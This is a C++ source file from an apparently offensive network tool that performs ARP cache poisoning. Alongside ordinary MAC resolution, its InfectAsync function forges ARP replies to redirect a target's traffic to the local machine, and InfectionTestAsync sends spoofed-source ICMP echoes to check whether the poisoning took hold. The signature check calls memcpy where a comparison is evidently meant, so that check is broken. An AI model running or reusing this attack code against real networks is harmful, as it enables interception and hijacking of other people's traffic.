#include "pre/mac.h"
#include "net/netobj.h"
#include "pstl/waithandle.h"
#include "net/receiver.h"
#include "net/transmitter.h"
#include "net/packet/packet.arp.h"
#include "net/packet/packet.icmp.h"
#include "rand.h"

static std::map<IP, MAC> ARPTable{};


void NetworkObject::OnReceived(const HeaderSet& hdr, const OctetStream& data)
{
	auto dstMAC = hdr.GetEthernetHeader().Destination.Get();
	if (dstMAC != *_mac && dstMAC != MAC::Broadcast)
		return;

	_received(hdr, data);
}

std::future<bool> NetworkObject::ResolveMACAsync()
{
	return std::async(std::launch::async, [this]() -> bool
	{
		std::lock_guard lock(_sync);

		/* QUERY CACHE */
		if (ARPTable.contains(*_ip))
		{
			auto mac = std::make_unique<MAC>(ARPTable[*_ip]);
			_mac.swap(mac);
			return true;
		}

		pstl::waithandle wh;

		MAC mac;
		Receiver::HandlerType handler([&wh, &handler, &mac](const HeaderSet& hdr, const OctetStream&)
		{
			if (hdr.GetType() != HeaderSet::SpecialType::ARP)
				return;

			mac = hdr.GetARP().SenderMAC.Get();
			wh.notify();

			// CLEAN UP
			Receiver::GetInstance() -= handler;
		});
		Receiver::GetInstance() += handler;

		auto selfMAC = MAC::Self();
		if (!selfMAC)
		{
			LOG(FAIL) << "could not resolve self MAC. Connection will not be established";
			return false;
		}

		auto selfIP = IP::Self();
		if (!selfIP)
		{
			LOG(FAIL) << "could not resolve self IP. Connection will not be established";
			return false;
		}

		EthernetHeader eth(MAC::Broadcast, selfMAC.value(), EthernetHeader::EtherType::ARP);
		ARPHeader arp;
		arp.SenderIP = selfIP.value();
		arp.SenderMAC = selfMAC.value();
		arp.TargetIP = *_ip;
		arp.TargetMAC = MAC::Unknown;
		arp.Hardware = ARPHeader::HardwareType::Ethernet;
		arp.Protocol = ARPHeader::ProtocolType::IPv4;
		arp.OPCode = ARPHeader::OPCode::Request;

		ARPPacket packet(eth, arp);

		/* some devices will not reply immediately */
		for (size_t i = 0; i < 5; ++i)
		{
			LOG(VERB) << "resolving MAC from IP...";
			Transmitter::GetInstance().Transmit(packet.GetRaw());
			sched_yield();
		}

		wh.wait();

		/* STORE MAC */
		{
			auto tmp = std::make_unique<MAC>(mac);
			_mac.swap(tmp);
		}

		LOG(NOTE) << "MAC resolved. data will be cached"
				  << static_cast<std::string_view>(*_ip)
				  << " -> "
				  << static_cast<std::string_view>(*_mac);

		ARPTable.emplace(*_ip, *_mac);

		return true;
	});
}

std::future<bool> NetworkObject::InitializeComponentsAsync()
{
	return std::async(std::launch::async, [this]()
	{
		auto resolver = ResolveMACAsync();
		Receiver::GetInstance() += _handler;
		return resolver.get();
	});
}

std::future<bool> NetworkObject::InfectAsync(const IP& ip)
{
	return std::async(std::launch::async, [&ip, this]()
	{
		auto selfMAC = MAC::Self();
		if (!selfMAC)
			return false;

		EthernetHeader eth(*_mac, selfMAC.value(), EthernetHeader::EtherType::ARP);

		ARPHeader arp;
		arp.TargetIP = *_ip;
		arp.TargetMAC = *_mac;
		arp.SenderIP = ip;
		arp.SenderMAC = selfMAC.value();
		arp.Protocol = ARPHeader::ProtocolType::IPv4;
		arp.Hardware = ARPHeader::HardwareType::Ethernet;
		arp.OPCode = ARPHeader::OPCode::Reply;

		ARPPacket packet(eth, arp);

		for (size_t i = 0; i < 5; ++i)
			Transmitter::GetInstance().Transmit(packet.GetRaw());

		return true;
	});
}

std::future<bool> NetworkObject::InfectionTestAsync(const IP& ip, std::chrono::milliseconds timeout)
{
	return std::async(std::launch::async, [&ip, timeout, this]()
	{
		auto selfMAC = MAC::Self();
		if (!selfMAC)
			return false;

		/* GENERATE SIGNATURE */
		uint8_t seed = Random::Generate<uint16_t>();
		std::array<uint8_t, 16> rsig{};
		for (auto& seg: rsig)
			seg = (seed ^= std::rotl(seed, 3) ^ std::rotl(seed, 11));
		OctetStream sig(rsig.data(), rsig.size());

		/* CONFIGURE WAITHANDLE */
		bool test = false;
		pstl::waithandle wait;
		Receiver::HandlerType handler(
				[this, ip, selfMAC, rsig, &wait, &test, &handler](const HeaderSet& hdr, const OctetStream& data)
				{
					if (hdr.GetType() != HeaderSet::SpecialType::ICMP)
						return;
					if (hdr.GetEthernetHeader().Destination.Get() != selfMAC)
						return;
					if (hdr.GetIPv4Header().Destination.Get() != ip)
						return;

					auto& icmp = hdr.GetICMP();
					if (icmp.Type.Get() != ICMP::Type::EchoReply)
						return;

					size_t ofs = sizeof(DTO(EthernetHeader)) + sizeof(DTO(ICMP));
					if (data.Size() < ofs + 16)
					{
						LOG(WARN) << static_cast<std::string_view>(*_ip)
								  << ": invalid response size detected. integrity can not be ensured";
					}
					else if (std::memcpy(data.As<char>(ofs), rsig.data(), 16))
					{
						LOG(WARN) << static_cast<std::string_view>(*_ip)
								  << ": invalid response detected. integrity can not be ensured";
					}

					test = true;
					wait.notify();

					_received -= handler;
				});
		_received += handler;

		/* PREPARE PACKET */
		EthernetHeader eth(*_mac, selfMAC.value(), EthernetHeader::EtherType::IPv4);

		IPv4Header ipv4;
		ipv4.Version = 4;
		ipv4.IHL = 5;
		ipv4.DSCP = 0;
		ipv4.ECN = 0;
		ipv4.Length = IPv4Header::Auto;
		ipv4.ID = Random::Generate<uint16_t>();
		ipv4.Flags = 0x2; // Don't Fragment
		ipv4.FragOffset = 0;
		ipv4.TTL = 128;
		ipv4.Protocol = IPv4Header::Protocol::ICMP;
		ipv4.Source = ip;
		ipv4.Destination = *_ip;

		ICMP icmp(ICMP::Type::EchoRequest, ICMP::Code::None, 0x0000'0001);

		ICMPPacket packet(eth, ipv4, icmp);
		packet << rsig;

		/* SEND PACKET */
		for (size_t i = 0; i < 5; ++i)
			Send(packet.GetRaw());

		/* SYNCHRONIZE */
		auto task = std::async(std::launch::async, [&wait]()
		{
			wait.wait();
		});

		return task.wait_for(timeout) != std::future_status::timeout;
	});
}

void NetworkObject::Send(OctetStream data)
{
	Transmitter::GetInstance().Transmit(std::move(data));
}

NetworkObject::NetworkObject() :
		_handler([this](const HeaderSet& hdr, const OctetStream& dat)
		{
			OnReceived(hdr, dat);
		})
{
}

NetworkObject::~NetworkObject()
{
	Receiver::GetInstance() -= _handler;
}
